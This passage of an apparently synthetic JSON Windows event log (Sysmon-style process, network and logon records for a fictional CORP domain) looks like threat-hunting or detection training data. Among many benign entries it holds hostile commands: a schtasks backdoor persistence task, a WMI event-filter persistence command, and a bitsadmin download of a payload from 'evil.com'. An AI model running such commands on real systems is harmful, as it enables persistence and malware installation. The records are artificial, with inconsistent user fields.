      "Hashes": "SHA256=f125210a8bc94ab437c6fd71c0ad34c97837b4ebaf1fb8cf74ba968d0f83484f"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-10T09:15:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "7757",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9685149b74872151d8b75d0f3a2102fcce96ceb7411ee2f12f43de867cbf18e9"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-07",
    "UtcTime": "2024-03-24T16:26:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.251",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.55",
      "SourcePort": "62135"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-01T09:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\schtasks.exe",
      "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\malware\\backdoor.exe /sc onlogon",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7437",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e915d419d136803883f1af4fff14490d908d01b543d192f3b752535aab578e94"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "alice",
    "UtcTime": "2024-03-05T13:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "8002",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1dfc401e86073338cba894013c63aab706cc1aa51e59f3e1eda55a8c43721e75"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-30T02:17:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7884",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=078d17056e84a060b00f725a945a06b00a678f4ef70a06d8577b7dc097d4bd86"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "bob",
    "UtcTime": "2024-03-14T02:28:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7768",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b65c89f01cf9c8c09eb75b4bb8ff86f002d340aa1206f4fc84370d9ca084aeb5"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "administrator",
    "UtcTime": "2024-03-04T19:23:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8374",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=010449a4a96e6cf845d310b5998ee3feeeea31d42ef2d5f0de3d182358c96f9e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "charlie",
    "UtcTime": "2024-03-18T05:13:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5750",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f299a7ec821d1a9c69105a03add9c7025654c1560eb05c0208d0f29d99787678"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-23T05:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "4069",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=06f5ba5b8f83424571bb6fc05d09dffbe7cddd11d5ea8e380cb2f653e1c19067"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T10:59:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "CommandLine": "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=Persistence,EventNamespace=root\\cimv2,QueryLanguage=WQL,Query=SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3049",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5fccc8af95ecb8d4b28bdb6023d9f59960bdae270245f14808abe33c8c7a103b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "administrator",
    "UtcTime": "2024-03-01T16:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "7109",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=55d3769522b22ac7afaeff6278c60940bb03e434554e128df784b60ee5d14a34"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "alice",
    "UtcTime": "2024-03-21T00:37:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7246",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=39e331e810059e014e1d34917f940088609be015537e2c01ccdb43a9d833c7fd"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-11T22:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8083",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=82ba23583c6e16714f6e92aadf368e821f617a380953204447469394f572a5b7"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-13T12:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "8925",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=82540cb4fdd19de4ad550ce7f441125375dfbe67f2cdadab652253c871f2e774"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T14:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "1812",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9bdadf81df1030afc578bf55fe8db78e0edf3900ffad0179065d8446a7046e99"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-19T18:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.147",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.169",
      "SourcePort": "65182"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "bob",
    "UtcTime": "2024-03-03T10:57:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "7190",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ab43091fe99bcc3b7889980a797c0937c94ab9c416b22e299012992b24237e7d"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "dave",
    "UtcTime": "2024-03-11T14:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8556",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=fe0a17861603634d9a268d5fa579f85286930cbefd3e094998d633348bd25a48"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "dave",
    "UtcTime": "2024-03-29T01:27:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "9100",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1d8fe713b025627089c205095100888bff68baa098e6b85516025306feca960a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-01T14:47:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "9678",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d80f110c1a53dddc563e7e529d30f982e1ffad859bf8dccbc771fc94dc2ebbf7"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-06",
    "UtcTime": "2024-03-23T19:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.130",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.128",
      "SourcePort": "61001"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "alice",
    "UtcTime": "2024-03-10T00:41:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "8478",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e2c037850cdd9c6b6f3d8145afd4b0de7acef2496fd09f344590ed4464f1d3c1"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-07",
    "UtcTime": "2024-03-29T20:46:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.160",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.46",
      "SourcePort": "60937"
    }
  },
  {
    "EventID": 4624,
    "Computer": "SERVER-02",
    "UserName": "alice",
    "UtcTime": "2024-03-19T04:31:00Z",
    "EventData": {
      "SubjectUserName": "dave",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "alice",
    "UtcTime": "2024-03-26T10:39:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "4236",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6ad999411a7fc9d47d35c212d5a90f5f0a25f12348e69ae18e1e2cc7ea553f21"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "alice",
    "UtcTime": "2024-03-10T22:25:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "1570",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c63584df4fc15f59fc3346de18d9acd2fd6af4a828244b162d2c390616505216"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "dave",
    "UtcTime": "2024-03-23T08:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "7774",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=cdff5c29b8b25c52880b6eb59306d49d97220524ecfd8921d984201f67a0bd00"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-24T19:34:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "2519",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=45e866ca584c486f02c304fc5d9f890f85504b1944e6700b38b85fca6492c62b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "alice",
    "UtcTime": "2024-03-07T22:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "9800",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0c0b47b62fa2e7110dad0bd0081edfb1050aeed94b4c7383a917066e2eda86b3"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-17T17:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9283",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b3a28bf12619578c435acd53af7c8547081c1278cf21c8f05b1daeb1a39bea62"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "alice",
    "UtcTime": "2024-03-30T03:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "6628",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a9418ab36141f45500b92ceb8acd8f9a0e327e5b1c921a5acb01d036be8e3bbd"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-22T23:31:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "3753",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ee24097bd0f945d00ad2fd21b62ae28534701faa7d2616d7ccbef517c8fd6113"
    }
  },
  {
    "EventID": 3,
    "Computer": "DC-01",
    "UtcTime": "2024-03-12T11:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.82",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.222",
      "SourcePort": "64539"
    }
  },
  {
    "EventID": 3,
    "Computer": "DC-01",
    "UtcTime": "2024-03-23T12:48:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "DestinationIp": "10.0.0.191",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.189",
      "SourcePort": "61644"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-05",
    "UtcTime": "2024-03-17T14:57:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.110",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.187",
      "SourcePort": "62467"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-29T10:14:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "6003",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0f0414d36a81788c21bd85e45ba1e05a1bff5010e2e801fd9af31b426729d05b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "dave",
    "UtcTime": "2024-03-23T00:39:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8427",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=bdcf8ffaa71316c05d6c07241d757639fda783d531ac372d7b22a07913088574"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "bob",
    "UtcTime": "2024-03-01T12:06:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
      "CommandLine": "bitsadmin.exe /transfer backdoor /download /priority foreground http://evil.com/payload.exe C:\\Users\\Public\\payload.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "9400",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=94bbb9c432dd5545a22327969b73864816a1134d8dd97b11dc3b480e026a52f2"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-21T12:19:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "8946",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3cdef5bad70d65a328d3ff6bd690c66bc6870b2f281b2d16c8a0187471a3f555"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-05T21:35:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "3210",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=430f84011b3c06fe0d98b5751001cd8e753c89b2dbad1b868180ed0e2d7f5f7a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-23T21:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1824",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9d696e63d43b2ee23aa313ed379ca7285a508fa2f0fd3e430540a810287af0b4"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-02",
    "UtcTime": "2024-03-23T01:35:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.22",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.71",
      "SourcePort": "52029"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-16T06:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "4198",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6823a1fad975a1734b0092e3bc550ba1c4e4984ffeaf79fe9e0f032af8de8ddd"
    }
  },
